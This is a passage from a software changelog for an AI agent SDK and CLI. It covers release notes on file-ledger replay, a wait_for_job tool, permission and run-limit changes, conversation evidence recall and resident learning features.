  What a replay may conclude is what the projection would admit, by the same predicates and the same bounded replay. A `write` whose call and successful receipt are both intact restores its body and its witness; the `edit` calls above it are replayed hop by hop and restore the chain. A `read` never supplies a body — the line numbering is never undone to recover one — and can only confirm one already reconstructed, by rendering it forward through the read tool's own renderer and comparing the whole rendering with the receipt. A windowed read, a read that shows something else, a cleared receipt, a hop that no longer applies, a body past the bounds and a call whose arguments run past what a replay reads as evidence each withdraw whatever the pass held for that path. So do the two cases where the transcript settles no outcome: a call it never answered — the unknown-outcome result the kernel's own repair writes for one included — may have landed with the file half written, and a mutation it refused is a tool's own report about that path, a drift refusal above all, made after reading the disk. Each of those costs the path it names and no other. A path whose walk ends holding no body is entered in the ledger nowhere, and a path this conversation only ever read establishes nothing.

  No file's content is read. The one thing the seed does touch the filesystem for is the key each entry is filed under: a ledger entry identifies a file rather than a spelling, so `read`, `write` and `edit` all key on the path canonicalized through its symlinks, and entries filed any other way would be entries no mutation ever checks and no drift refusal can ever withdraw. The paths named in the history are therefore resolved exactly as the tools resolve them — `additionalDirectories` included — before the walk begins. Under a sandbox the keys are the paths as written and no host path is consulted.

  Only content-backed observations are restored, so a seeded ledger is never weaker than the empty one a resume starts from. A path whose body could not be reconstructed is left OUT of the ledger rather than entered without a fingerprint: `hasRead` is the read-before-overwrite refusal, and granting it with no body to compare would let a full overwrite of a file that changed while the session was closed through with nothing checked. Every path the replay does not restore therefore behaves exactly as it does today. A fingerprint it does restore is a claim derived from history and is still compared with the real file at mutation time, so a file changed while the session was closed is refused there and the refusal withdraws the path from the projection.

  Three things seed nothing at all, each leaving today's empty ledger: a history naming more than 1,024 distinct path spellings — the ones only `read` names included, and two spellings of one file counting twice — which is resolved whole or not at all rather than in a prefix that cannot say what a mutation replaced; a tool call id claimed by two calls or answered by two receipts, `read` included, since the receipt that was hidden could be the observation that withdrew a claim; and a mutation no path can be recovered from, whatever came back to it — one declaring no `path`, one whose path no longer resolves inside the directories the run may reach (a refused write to a path outside them is one of these: a key is what withdrawing one path rather than the whole pass takes), or one the provider stream cut off mid-JSON, whose arguments are recorded as `{}`. A merely large call is none of these: the argument bound governs what may be believed, not what may be attributed, so an oversize `write` withdraws its own path's body and leaves every other witness standing.

  `read`'s numbering and windowing move to `tools/builtins/read-render.ts` as pure functions, which is what lets the forward-render comparison run the tool's own renderer rather than a copy of it. The tool's output is unchanged, byte for byte.

- 7ca8c7d: Add a `wait_for_job` builtin tool: it blocks on a background job's exit under a run-length bound and an idle bound that resets on new output, and returns the job's accumulated output in one call — the shell-job counterpart to the existing `wait_for_task`. Neither bound stops the job; a timeout reports which clock ran out and the output read so far, with a `next_offset` to resume from. Ships by default alongside `job` and `bash`, and refuses cleanly on a host with no background job registry.

  `job`'s own description no longer instructs polling with `action: "read"` in a loop; it now points at `wait_for_job` instead. `read` and `list` are unchanged.

  `BackgroundJobRegistry` gains a public `waitForExit(id, { signal })`, resolving immediately for a job that has already exited and honouring an abort signal. `BackgroundJobRegistryRef` (the tool-context surface) gains an optional `waitForExit` of the same shape — additive, so an existing host implementing this interface directly keeps working without it; `wait_for_job` refuses cleanly when it is absent.

- Updated dependencies [68e535b]
- Updated dependencies [a9e4b19]
- Updated dependencies [a54dc71]
- Updated dependencies [86a3818]
- Updated dependencies [03630cd]
- Updated dependencies [f33c62b]
- Updated dependencies [a8df193]
- Updated dependencies [8bfe291]
- Updated dependencies [6ae4072]
- Updated dependencies [dd8702d]
- Updated dependencies [92ab1d9]
- Updated dependencies [e6d6d1e]
- Updated dependencies [7ca8c7d]
- Updated dependencies [6551d15]
  - @namzu/sdk@40.0.0
  - @namzu/zen@1.0.2
  - @namzu/computer-use@1.4.2
  - @namzu/anthropic@5.1.1
  - @namzu/ollama@2.2.2
  - @namzu/openai@3.1.1
  - @namzu/openrouter@2.4.0

## 25.0.0

### Major Changes

- 9463b6f: Background job `read` and `list` calls now count as read-only observations by default; starting commands and `job kill` retain their existing approval requirements. SDK `defineTool` accepts an input predicate for `readOnly`.

  Explicit CLI `ask` rules are now enforced rather than omitted, so they can request review ahead of a wildcard allowance or the read-only default. SDK custom-pattern rules support `decision: 'review'`, with an `authorization.explicitReview` marker on review summaries. Read-only and accept-edits exemptions honor it; explicit auto modes and prior approvals keep their meaning.

  To keep reviewing every background-job operation in prompt mode, configure `permissions: { job: ask }`, or supply a matching SDK custom-pattern review rule. If an old `ask` entry was intended to inherit default behavior, remove that entry instead. Deny rules, plan-mode mutation restrictions, job ownership and sandbox boundaries remain enforced.

- b2e5551: Default CLI main runs and built-in delegated agents to unlimited token usage,
  iterations and run duration. Previously main runs defaulted to 50 iterations,
  children to 40, and both to a one-hour deadline. To keep bounded execution, set
  positive `limits.maxIterations` and `limits.timeoutMs` in your configuration;
  explicit values apply to both the main run and built-in children. SDK embedding
  defaults and file-defined specialist iteration settings remain unchanged.

  Add Run limits to `/config`: edit tokens, model turns and duration, or remove all
  three caps. Changes apply to new turns and their children for the current TUI
  session; running work retains its captured limits and usage ledger. Resuming a paused
  CLI run reloads its own saved limits instead of replacing them with launch defaults. Persistent
  limits still come from the configuration files. Usage accounting, cancellation,
  permissions and provider quotas continue to apply in unlimited mode.

- fe6e0fb: Avoid reading and parsing a shared compaction record once for every removed
  message. A search reuses one authenticated record within that operation; later
  calls revalidate it. Text manifests, integrity checks, cancellation and page
  limits remain in effect.

  CLI manual compaction now stores one `compaction_shed` event containing all
  removed messages, matching automatic compaction, instead of one event per message.
  Consumers of raw manual-maintenance events must iterate the `messages` array
  and use search results' `seq` and `part` addresses, rather than assuming `part: 0`
  or one sequence per message. Existing archives and SDK event readers remain
  supported. No config change is required for ordinary CLI use.

- 64b3da9: New `search_conversation` calls now exclude successful outputs of `search_conversation` and `read_conversation` by default. Previously, explicit searches included them and could find their own earlier results as repeated evidence.

  To keep the previous unfiltered behavior or inspect retrieval outputs themselves, pass `includeRetrievalResults: true` on a new search. Omit the option when continuing a cursor: its source filter is preserved, and incompatible changes are rejected. Failed retrievals and records with unknown tool names or success status remain searchable. Exact reads of known authorized records remain available. SDK evidence-source defaults are unchanged.

- cff2b6a: Conversation search now ignores letter case by default: searching for `destination` also finds `Destination`. Pass `caseSensitive: true` to `search_conversation` to keep the former behavior. Continue pages with the same query and case setting.

  SDK run-evidence search adds optional `caseSensitive` (default `true`, unchanged). Active and closed run sources now return distinct matching passages within one text chunk, with continuation at the match limit, rather than hiding later passages in that chunk. Exact retained text, UTF-8/UTF-16 offsets, integrity verification and per-call I/O limits remain intact. Case-insensitive searches bypass exact-case filters and may read more bytes or require more pages.

- 32080b1: Durable `drain` now mounts `search_conversation` and `read_conversation` under
  the persisted conversation's ownership and honors configured compaction,
  memory and web options. These options were previously omitted from its host.
  It can recover original retained command output without running the command
  again or treating an internal backing file as workspace content.

  The retained-output preview default on this entrypoint now follows the CLI's
  4,000-character setting instead of its previous 40,000-character preview. Set
  `compaction.retainedToolPreviewChars: 0` to preserve the former preview behavior.
  Previously ignored compaction, memory and web configuration now takes effect;
  review those keys when upgrading an unattended drainer.

  A resumed run that ends as failed or cancelled is now reported in `failed`
  with exit code 1 instead of being reported as a successful drain.

- b2d5b01: Support explicit unlimited run guards while retaining measured token usage.
  Set `tokenBudget: 0`, `maxIterations: 0` and `timeoutMs: 0` in SDK run options,
  or in the CLI's `limits` configuration, to disable those three caps. The CLI's
  `--token-budget 0` and `--max-iterations 0` now override configured caps; blank,
  negative and unsafe numeric values are refused. Omitted defaults are unchanged.

  SDK breaking change: `maxIterations: 0` and `timeoutMs: 0` previously prevented
  progress; they now disable those guards, consistently with the token limit.
  Hosts that used zero to prevent a run from starting must refuse admission or
  pass an already-aborted signal instead. Use positive values for finite guards.

  CLI breaking change: an explicitly configured `limits.maxIterations` now applies
  to built-in subagents too, instead of always giving them 40 iterations. Existing
  configurations with a smaller value can stop children earlier; larger values
  permit more work. Omit that setting to retain the previous child default (40)
  and parent default (50), or define a specialist agent with its own iteration
  configuration when the two must differ. The new `limits.timeoutMs` setting also
  reaches child runs and blocking delegation tools. `0` does not bypass a finite
  ancestor token cap, permissions, operator cancellation or unresolved usage.

- f49a4b8: Add optional run-metered, tool-free `PrepareStepContext.generateText` and
  `createEvidenceRecallStep({ resolveQuery: true })` for resolving historical
  follow-ups against bounded visible conversation. Generated search terms must
  occur in the question or exact cited history. SDK query resolution defaults off.

  In the CLI, conversations with `compaction.recallEvidence: true` now resolve
  eligible conversational queries by default. This can add one provider request
  per operator input, up to 512 output tokens and ten seconds before local
  retrieval. It consumes the same run token budget. Set
  `compaction.resolveEvidenceQueries: false` to keep the previous literal-query,
  local-only behavior. Automatic recall itself still defaults off.

- c4aaf9b: Interactive CLI sessions now honor `limits.maxIterations` and `limits.tokenBudget` from user and trusted project configuration. Previously these configured limits were ignored by TUI startup, although headless commands applied them. This also applies when rebuilding a session after a model change or reopening a conversation. To keep interactive cumulative tokens unlimited, omit `limits.tokenBudget` from the effective config and use `--token-budget` for individual headless runs. Omitted defaults remain unchanged; `limits.waitForProviderMs` remains a headless policy.

  SDK closing prose requested by a token, cost or time warning now preserves the triggering limit's stop reason instead of reporting `end_turn`. The partial text is still returned, including when allowance remains, but this path skips prose answer review and must not be treated as verified completion. Cancellation and validated native structured-output settlement retain their existing behavior.

- 97acc32: Resident run/start now automatically retrieve bounded original tool evidence
  from earlier settled admissions before model requests, under both context
  profiles. Previously these admissions exposed explicit archive tools only.
  Set `compaction.recallEvidence: false` to retain that previous behavior. This
  adds local archive I/O and request context; it does not add query-planning
  inference, replay actions or grant ordinary chats/delegated agents access.

  SDK hosts can attach `createResidentEvidenceRecallStep` to an admitted run.
  It preserves historical Session/run/claim addresses and shares bounded evidence
  selection with conversation recall. Resident tool sources also support bounded
  token queries and exact cursor-only recovery, retaining query/filter identity
  across reopening. Incomplete results do not establish absence.

  Resident Sessions now leave signal handling to their enclosing host. Previously
  the SDK emergency handler could exit immediately on SIGINT/SIGTERM before the
  host wrote cleanup/runner receipts. Cancellation now drains through the resident
  lifecycle and preserves the interrupted claim for inspected reconciliation.

- 6cd24e9: Enable automatic historical evidence recall by default in recorded CLI conversations, including resumed conversations and resident turns using the conversation host. Previously, omitted `compaction.recallEvidence` disabled this preparation even when original tool text had been shortened to a retained preview.

  Follow-ups may now make an additional bounded, metered model call to resolve the historical subject, then read scoped conversation evidence into the next request. This adds inference usage and possible latency; it shares the run's provider, effort, token budget and cancellation. Retrieval retains its existing four-page, 8 MiB read and 6,000-character context ceilings.

  Set `compaction.recallEvidence: false` to retain the previous default, disabling both automatic archive reads and query-planning inference. Set `compaction.resolveEvidenceQueries: false` to keep automatic literal retrieval without the extra inference. Explicit archive tools remain available. SDK host defaults and stateless archive access are unchanged.

- f92daf8: Resident `run` and `start` now default to `--learning-disclosure on-demand` in the resident context profile. Previously all accepted learned skill bodies were included automatically; now the model sees their descriptions and can read relevant guidance with `read_resident_skill`. To retain automatic inclusion, pass `--learning-disclosure eager`. The interactive context profile and ordinary chat retain their existing behavior. Stored learning is unchanged.

  The SDK adds `createResidentStepContext`, which returns prompt contributions and a read-only skill tool bound by the host to one admitted run. Source dependencies are checked when instructions are read and before subsequent requests. Existing `createResidentStepContributions` callers retain eager disclosure.

- 5d31eea: Resident learning hosts and direct skill promotions now require a `protection` plan with disjoint `verification` and `confirmation` task IDs chosen before candidate generation. Existing hosts without this field are refused before inference. Include at least one real preservation task per round, with two measured successful baseline trials and two successful candidate trials. Missing or uncertain controls block activation; losing one established success rejects the candidate even when aggregate scores improve.

  Update `ResidentLearningCycleOptions`, discovery hosts, and `ResidentSkillEvaluation` callers to supply this plan and its actual paired evidence. Historical stored skills remain readable but do not gain protection evidence retroactively. Generic `reviewHarnessCandidate` callers can opt into the same checks with its third argument. CLI learning summaries display protected-task outcomes.

- f1e33a1: Resident wake calls now retain all accepted inputs until the next step settles, instead of replacing the previous wake reason. `ResidentState.wakeEvidence` exposes immutable reasons and receipt times; the SDK resident prompt and both CLI resident profiles include the complete batch. CLI resident status shows pending input counts.

  The new default accepts at most 16 pending inputs and 16,000 total reason characters per pursuit. Overflow rejects the new wake without discarding accepted evidence. Callers that previously sent an unlimited series of replacement wakes must process each batch before sending more, or coalesce superseded inputs before calling `wake`. Custom callbacks should read `wakeEvidence` rather than only the latest `reason`.

  Standalone resident records now write schema 2 and agenda records schema 6. Older processes refuse these new formats: upgrade all processes sharing the store together. Prior formats remain readable without inventing historical inputs. Crashed steps keep their pending evidence; only successful exact-claim settlement or explicit inspected reconciliation consumes it.

- b888779: Separate the SDK's overflow threshold from the size of an authenticated retained-output preview. `query`/`resumeRun` and `ReactiveAgent` accept `retainedToolPreviewChars`; unset or zero preserves the existing behavior. A shorter preview is used only after full host text and its integrity manifest are saved. Storage failure keeps the ordinary text budget. Rich blocks and independently supplied model text keep their existing handling.

  Recorded CLI conversations now default to at most 4,000 characters for these retained overflow previews, previously up to 40,000. The 40,000-character spill threshold and ordinary smaller results are unchanged. Set `compaction.retainedToolPreviewChars: 0` in CLI configuration to retain the previous preview size. This applies to new tool results in ordinary turns and resumed runs, without rewriting existing history. Stateless sessions and delegated workers retain their existing defaults.

- ea5367d: The CLI now requires Node.js 22.13+ and stores session metadata in
  `NAMZU_HOME/state/sessions.sqlite`, with artifacts directly under
  `NAMZU_HOME/sessions/<sessionId>/`. It no longer creates or reads a `projects/`
  runtime tree. Generated memory remains isolated under `memory/<projectId>/`,
  and resident state moves to `residents/<projectId>/<agent>/`.

  This changes the default persisted CLI format. Existing project trees are left
  untouched and are not imported automatically. Back up the original application
  home and retain the older CLI to access its conversations, generated memory
  and residents. Credentials, preferences and authored configuration keep their
  locations. Update custom artifact readers to the new session paths.

  The SDK adds the optional `SqliteSessionStore` driver and an exact `directory`
  option for `DiskMemoryStore`. Existing SDK drivers, formats and defaults remain
  unchanged; SQLite is loaded only when its driver is used.

  `history` now accepts real conversation UUIDs as well as host keys, and with no
  key reads the most recent workspace conversation as its help documents.

### Minor Changes

- 2a1e0e5: Preserve provider-identified public assistant message items through streaming,
  settlement and conversation persistence. The SDK adds optional `textParts`
  snapshots, `textPart` delta metadata and `selectAssistantText`. Completed content
  selects explicitly final answers instead of concatenating intermediate progress
  into the answer; ordinary unphased streams retain their existing behavior.

  The Codex subscription driver maps native message phases and verifies the original
  public parts before native replay. The CLI exposes optional item metadata on
  delta events, separates streamed item bubbles and uses the settled answer for
  turn completion. Consumers that manually concatenate deltas should use completed
  content when they want the final answer; deltas still contain public progress.

- ce55c21: Add experimental `createEvidenceRecallStep` and its typed host retrieval contract.
  It ranks a bounded pool of authenticated historical passages and supplies exact
  excerpts with source/error/preview labels in request-only context. Every request
  revalidates ownership and source data; deadlines discard late reads without
  accumulating overlapping retrieval or replaying actions.

  Recorded CLI conversations can opt in with `compaction.recallEvidence: true`.
  The default remains off. Automatic recall excludes the requesting invocation;
  explicit conversation search/read still cover live evidence, more pages and
  complete text. This adds historical context, not automatic verification of
  current workspace state or a guarantee of exhaustive recall.

- bb0281b: Add optional `EvidenceRecallBatch.continuations` with exported
  `EvidenceRecallContinuation` hints for bounded, host-mounted read-only tools.
  Incomplete recall now reports its status even when no new passage is selected,
  so missing context cannot silently look like an exhaustive negative search.
  Hint arguments and output are bounded within the existing context allowance.

  CLI `search_conversation` accepts `cursor` alone to restore the original query,
  case setting and excluded invocation. Automatic recall supplies these handles
  when live or earlier-run traversal has more pages. The model can continue from
  that position without replaying an action or starting the same scan again.
  New searches still require a literal query. Scope, expiry, source-integrity
  checks and read limits remain enforced; live handles require the same active
  writer and never downgrade to another source. Automatic recall remains opt-in.

- 2869fbe: Add an optional SQLite resident learning journal with atomic event/summary updates, scoped ancestry and recorded usage, plus hash-verified immutable JSON artifacts. `runStoredResidentLearningCycle` connects existing generation and independent evaluation callbacks to the journal without adding another model loop. The store requires Node.js 22.13 or newer when used; other SDK stores retain their existing support.

  Add `namzu resident learn <experiment.learning.mjs>` for explicit trusted host modules and `namzu resident learning [cycle-id]` for read-only inspection. Modules select and bound their own providers and evaluators. Interrupted work and incomplete prices remain visible; these commands do not automatically replay experiments, activate unverified guidance or start background learning. Records live in `state/learning.sqlite` and `learning/artifacts/`; accepted skills remain in the existing resident agenda.

  Expose `pathBuilder`, `runStore` and `checkpointStore` on `runAgent`, forwarding the kernel's existing host storage controls. Hosts can separate generated execution evidence from a searched workspace. Omitting these options preserves the SDK's current local layout; the CLI retains its application-home layout.

- d5d2b9a: Expose optional `recordedAt` Unix milliseconds on evidence search matches, exact read pages and recall candidates. CLI conversation search/read and automatic recall preserve the stored event time, including each included occurrence of equal text. Callers can distinguish recording times without inferring them from run IDs, file times or run-start metadata.

  Unknown or invalid stored timestamps stay absent; custom recall callbacks must omit unknown times and supply positive integer milliseconds within the JavaScript Date range when known. The timestamp dates recording, not fact validity; compaction copies carry their own copy time. Sequence still orders one run, and clocks across runs do not establish causal order. Existing retrieval ordering, scope, read limits and source validation remain unchanged.

- b971796: Expose `classifyEvidenceSource`, `EvidenceRecordKind` and `EVIDENCE_RECORD_GUIDANCE` for hosts presenting authenticated text evidence. Automatic recall uses the same classification. The helper interprets source tags only; it does not authenticate text or establish that its claims are true.

  CLI `search_conversation` matches and located `read_conversation` pages now include `recordKind` with interpretation guidance. Exact reads also preserve recorded `toolName` and `isError`, leaving missing status unknown. Tool names exceeding 256 JSON-encoded UTF-8 bytes are omitted consistently. Original text, addresses, scope checks and pagination remain unchanged.

- 0a0baf2: Add bounded resident activity inspection and a reusable consumption projection in the SDK. The CLI's new `namzu resident inspect` command reports retained admissions, settlements, archived pursuits, historical verification receipts and known versus missing usage across process restarts.

  Root usage and descendant-inclusive token totals remain separate. Missing or interrupted receipts are explicitly incomplete; unpriced tokens do not imply free work. Cost reports cover the root invocation, not descendant prices or a provider bill. Inspection does not impose a new lifetime spending limit or change existing execution defaults. Use `--max-revisions` or the returned `--cursor` to inspect histories beyond the default bounded range.

- 4828eb0: Add opt-in learning discovery from retained, host-scored failures. Hosts can record observations and authorize evaluator revisions; the SDK selects an eligible task against the installed guidance, then uses the existing generation, verification and fresh confirmation cycle. Task claims survive process restarts and prevent concurrent or accidental duplicate experiments. Provider errors, unresolved usage and obsolete observations are excluded from selection.

  The CLI accepts discovery hosts in `resident learn` and adds `resident learning --observations` for paginated inspection. Compact output includes failure reasons and verification/confirmation pass counts so inspection does not require following raw artifact hashes. Existing explicit-failure hosts remain supported. Learning storage upgrades to schema 2 on its next write; older SDK builds restricted to schema 1 cannot reopen that upgraded database. Keep a database backup if a rollback to such a build is required.

- b649224: Expose optional `PrepareStepContext.captureRunEvidence(maxReadBytes?, signal?)`
  for authenticated text from the current invocation's writer. It rejects local
  or run cancellation and settled invocations; unsupported stores return
  `undefined`. Automatic evidence recall forwards this capability with its own
  deadline and revokes new captures when the recall pass ends.

  With `compaction.recallEvidence: true`, recorded CLI turns now recall missing
  observations from the current run, including after compaction. Up to two live
  pages share the existing four-page, 8 MiB read ceiling with earlier runs;
  explicit conversation tools still handle further pages and exact full text.
  The default remains off. Captured observations describe the past and do not
  establish current workspace contents or replay a tool action.

- e0b30c2: The `/plugins` menu can now explicitly remember a plugin's enabled or disabled state across restarts and model switches. Session-only controls keep their existing behavior. A remembered disabled plugin remains visible without importing its executable modules or starting its MCP servers. Choices belong to the plugin's canonical directory and name, so another project's same-named plugin is unaffected. Settings are stored privately in `NAMZU_HOME/plugin-settings`; loading configuration and project trust still apply.
- 6394010: Learning hosts can supply an optional `explore` callback to run environment experiments before generating guidance. The SDK retains bounded observations and their digest, then provides them to `generate` as `context.exploration`. Missing usage, cancellation, stale state or evidence-journal failure prevents continuing to synthesis or activation.

  The CLI forwards the callback, shows its exploration phase and retains evidence in SQLite. Hosts that omit it keep their current behavior. Event consumers opting into this feature should handle the new `explore` stage and `exploration` event kind. Exploration needs separately authorized tools and independent evaluation; enabling it does not automatically start learning in ordinary conversations.

- f4b3ffb: Residents can retrieve earlier settled summaries and consumed wake inputs when
  the latest summary omits needed evidence. The SDK adds experimental
  `DiskResidentAgenda.history`, `ResidentHistorySource` and related result types,
  `buildResidentHistoryTools`, and optional `ResidentStepPromptOptions.history`.
  Searches are bounded and paged, tied to one pursuit and an explicit upper
  revision, and report unreadable evidence without treating it as proven absence.

  CLI foreground and managed resident runs mount the two read-only recall tools
  in both context profiles, including deferred loading. Ordinary conversations
  and delegated children do not inherit the resident's history. These tools read
  existing immutable revisions; they do not restore full tool transcripts, replay
  actions, or change the persisted schema.

- d1a6ce5: Residents can search and page original retained tool text from earlier settled invocations, even when the latest summary or compacted context omits it. The SDK adds bounded disk indexing, scoped source interfaces and `search_resident_tools` / `read_resident_tool` builders. The CLI binds them to the admitted pursuit, matching attempt receipts and invocation ownership; ordinary conversations gain no cross-session access.

  Fix fresh disk-backed runs capturing their output directory before store initialization, which could leave oversized tool output as an unrecoverable preview. New spills record chunk integrity manifests, and new run metadata records its own tenant/project/Session/run scope independently of shared token accounting. The existing 40,000-character model-visible cap remains unchanged. Older unscoped runs are unavailable through this API; older truncated records without authenticated spills remain explicitly partial. Missing or modified output is never replayed or presented as an intact original.

- 8095541: Allow resident skill candidates to declare source revision dependencies. Their approval hash includes those bindings, and context projection withholds a bound skill unless every dependency matches fresh host observations. Unbound candidates keep their existing hashes and behavior. SDK hosts can resolve revisions per model request; the CLI resident profile supports bounded workspace-file SHA-256 observations.

  Correct TUI stop messages for unresolved usage and accounting failures, including unlimited runs, so they no longer claim the token allowance was exhausted.

- bdf923d: Add `/plugins` to inspect loaded plugins and enable or disable them for an idle session. The menu reports registered tools and skills, shows plugin scope and directory, and explains how to configure loading when it is off. Changes reset on restart or model switch; configuration and plugin files are retained. Active sends, compaction and durable resumes prevent plugin changes, and session cleanup waits for a pending change to settle.

  Fix discovery when project and user plugin locations resolve to the same directory under an explicit application home. Load that directory once as user scope; project-only scope still excludes it. Distinct plugin directories remain discoverable even if their authority roots match.

- 0a36260: Add `createJsonClaimVerifier` for host-configured scalar JSON claims and observation-time receipts. It rejects mismatched, incomplete, historical or foreign observations, bounds verification time and bytes, and exposes pending observation drainage. Hosts supply an authorized read adapter; this does not verify arbitrary prose or establish atomic/future source state.

  Resident `run` and `start` accept `--verify <manifest>` to require configured claims before recording completion. The manifest explicitly authorizes bounded host file reads, is snapshotted per invocation, and applies to every admitted pursuit. Rejected values use the existing repair budget; only the reviewed answer can complete. Existing invocation behavior is unchanged without the flag.

### Patch Changes

- 7bb8163: SDK evidence sources now accept `matchMode: 'token'` for complete Unicode
  letter/number/underscore terms, with the same lowercase keys used by bounded
  evidence ranking. The default remains literal substring search. Token queries
  must contain one token per term; use literal mode for phrases or punctuation.
  Continuations retain their matching mode, and token search authenticates the
  preceding chunk when checking a word boundary within the existing I/O budget.

  CLI automatic evidence recall uses this mode to keep incidental substrings
  such as `in` inside `Packing`, or `3` inside `13000`, from consuming its candidate
  slots. Explicit conversation search still supports literal substrings.
  Whole-word frequency can still limit bounded discovery; this change does not
  claim complete or globally ranked archive retrieval.

- 6663561: Prose `reviewAnswer` callbacks now fail the run when they throw or return a malformed verdict. Previously a thrown error accepted the answer without review. To keep a deliberately permissive policy, catch the error in the host callback and explicitly return `{ accept: true }`; return `{ accept: false, feedback }` only when requesting a bounded correction. Rejection feedback must be a nonempty string.

  `maxAnswerReviews` now rejects negative, fractional, non-finite or unsafe values. Use a nonnegative safe integer (default three corrections). Rejection counts and feedback are saved together in checkpoints, so resuming the same checkpoint preserves the remaining allowance even after history compaction. Cancellation stops waiting for a pending reviewer; external work started by the callback must still honor its signal.

  The CLI inherits these SDK semantics for host-supplied reviewers. Its command gate already converts unavailable checks to bounded rejection and keeps that behavior. Forced finalization, terminal tools and structured output retain their separate settlement paths.

- 6e4a820: Recover original oversized tool text in ordinary conversations after compaction or restart. `search_conversation` and `read_conversation` now use authenticated retained output for closed scoped runs while preserving assistant-message and compaction-history search. Search results can provide a UTF-8 byte position for reading near a match; returned character positions remain UTF-16. Missing or changed originals are explicitly unavailable, and partial legacy records remain previews.

  The SDK adds `createDiskRunTextEvidenceSource` and its public types, a bounded text view alongside the existing tool-only evidence source, plus an optional smaller per-operation read ceiling. New spill manifests record character positions without changing the existing tool-only source interface.

  Headless `run --resume`/`--continue` and persistent `run-stream --session` now receive conversation retrieval tools. Both search and read remain available with deferred tool loading. Hosts still authorize the invoking conversation; no tool is replayed to recover its result.

- bde219d: Preserve underscores within identifiers in assistant replies. For example,
  `RUN_LIMITS_READY` now displays exactly as returned instead of losing its
  underscores to italic formatting. Standalone underscore emphasis still works;
  stored conversation content is unchanged.
- 61d47e1: Clean up application homes created by the CLI test suite after both passing and failing tests, with a run-owned parent and final runner-exit sweep for late TUI persistence. Explicitly supplied homes remain untouched, including when a test changes `NAMZU_HOME`. This prevents development and CI runs from accumulating temporary session state; installed CLI behavior is unchanged.
- eb2e7ba: Preserve Codex native response items when the subscription stream sends them as completed output-item events but leaves the final response output empty. Newly recorded conversations now retain those reasoning and tool-call items for eligible tool continuations and resume. The same correction retains hosted citations and reports tool-call finish reasons correctly. Existing route and message-integrity checks remain in force; native state already discarded by older versions cannot be recovered by upgrading.
- 738d012: Recover a retained conversation passage after restart without spending a model
  turn on every empty index page. Each read now advances through at most eight
  lookup pages within its existing 8 MiB allowance, checking source ownership and
  integrity before each operation. A continuation still returns when the work or
  byte allowance requires another call. Durable addresses, exact text, read offsets
  and cancellation behavior are unchanged.
- bd4bd2e: Allow automatic evidence-query resolution to use one explicitly marked compaction summary as a derived lookup reference after original turns leave visible history. The existing six-excerpt, 64-message and inference limits remain; ordinary system policy and tool text are excluded. Query-resolution basis metadata may now include `source: "compaction-summary"`. This provenance marks a derived reference, not proof of the requested fact: answers still require retained originals. Recorded CLI conversations use this through their existing recall configuration.
- 17933cf: Conversation search now advances through fully searched, nonmatching indexed runs in the same call instead of requiring a model round trip for each irrelevant run. It keeps the shared 8 MiB read ceiling, bounded directory discovery, source ownership checks and existing result limits. Partial index pages and matching pages still return control with a continuation when needed; unavailable evidence remains explicitly incomplete.

  The read tool now asks the model to copy the search result's exact byte position, and gives actionable recovery guidance when an estimated position splits a UTF-8 character. It continues to refuse invalid reads rather than silently adjusting the requested position.

- f1cd16e: Conversation search and read results now show concise source and page-status summaries in the TUI. Retained previews, partial pages, unavailable search runs and recorded tool errors stay visible instead of appearing as plain complete text. Ctrl+O retains the full returned JSON and uses a single-line window heading. Tool responses sent to the model, stored evidence, access checks and retrieval limits are unchanged.
- 77eac40: Conversation search can return matches from several completely searched runs in one call instead of stopping at the first matching run. The existing result limit, 12,000-byte match allowance, 8 MiB read ceiling and bounded directory discovery still apply. The host reserves output space before each SDK operation and adjusts its requested match count to the available room, including escaped text and source metadata. Partial index pages still yield their continuation, and missing or changed evidence remains incomplete. Callers should continue to use returned cursors rather than assume a page belongs to one run.
- df686fc: System messages can now carry `source: { type: 'compaction-summary' }`.
  Kernel-generated compaction summaries receive this marker. When retained,
  their text is searchable and readable as `compaction_shed:summary`, preserving
  exact text and existing part positions. Ordinary system text with the same
  heading and older unmarked archives keep their previous classification.

  Automatic evidence recall orders matching source records before known derived
  summaries within its bounded candidate pool, using separate relevance statistics.
  Summaries remain available as passages and exact read addresses; they are not
  deleted. CLI evidence guidance explains that these are derived text, not
  independent observations. Recall limits and opt-in settings are unchanged.

- e954d02: Automatic evidence recall now reports `omittedPassages` when eligible distinct
  records do not fit the selected passage count or context size. Bounded
  `additionalEvidence` addresses let archive tools recover withheld text;
  `omittedAddresses` reports addresses which also could not fit. The original
  scope checks and character ceiling remain in force.

  The context can now retain an omission notice and read address even when no
  whole excerpt fits. `incomplete` continues to describe source traversal, rather
  than implying that every matched record was presented. In the CLI these
  addresses work with the existing `read_conversation` tool. This corrects hidden
  selection loss without changing the recall opt-in or adding model calls to the
  retrieval hook itself.

- df143c8: Expose optional `excerptComplete` on retained-evidence search matches and recall candidates. Built-in sources prove whether the displayed excerpt contains a whole full-retained text part using validated UTF-8 bounds. A partial excerpt or retained preview reports false; custom sources that omit the field remain unknown.

  CLI conversation search and automatic recall preserve this information and explain when reading the same unchanged part adds no text or independent evidence. The field describes one text part, not the truth of its claims or coverage of the whole conversation. Existing scope, integrity, cancellation and context limits remain enforced.

- 45c8292: Fix opt-in evidence query resolution skipping follow-up questions after six or
  more assistant progress messages. Within the existing 64-message scan, retain
  the nearest preceding operator request and five recent updates when progress
  would otherwise fill all six reference slots. The prompt, retrieval and scan
  ceilings remain unchanged. A missing or compacted-away request is not invented.

  Do not rewind the reference window to an older identical question when the
  current retained input is outside visible history, such as steering carried on
  a tool result. Use the known message object as the boundary when available;
  otherwise consider bounded recent history instead of inventing a position.

  Normalize grounded filenames and punctuation-separated identifiers into the
  same word tokens used by evidence discovery. A valid term such as
  `sevkiyatlar.txt` no longer causes the entire optional plan to fail; all expanded
  tokens must remain grounded and fit the existing 16-token ceiling.

  Cover this behavior through the CLI Session host, including the existing
  `resolveEvidenceQueries: false` opt-out. The CLI adds no default model call.

- 6a6921c: Report unavailable automatic historical evidence in temporary model context instead of silently dropping every sign of a failed query plan or read. The short status distinguishes planning failure, retrieval failure, timeout and an earlier read still pending; it does not imply that the requested history is absent.

  Raw error bodies, malformed plans and rejected source data stay out of the note. Existing error diagnostics and direct callback rejections remain, parent cancellation stops work, and context/read bounds still apply. Explicit archive tools remain available, and a failed cached query plan does not trigger an extra model call each iteration. No status note is stored as operator conversation history.

- 691342c: Automatic conversation recall now labels selected passages and visible-source
  references with their producer kind. Prior assistant statements are identified
  as claims rather than proof of observed file state or successful actions.

  Within the existing candidate and context limits, selection keeps the best
  lexical match first and then considers matching records from other producer
  kinds before repeating a kind. This prevents repeated model claims from taking
  every slot when a tool record is available. Derived summaries remain last.
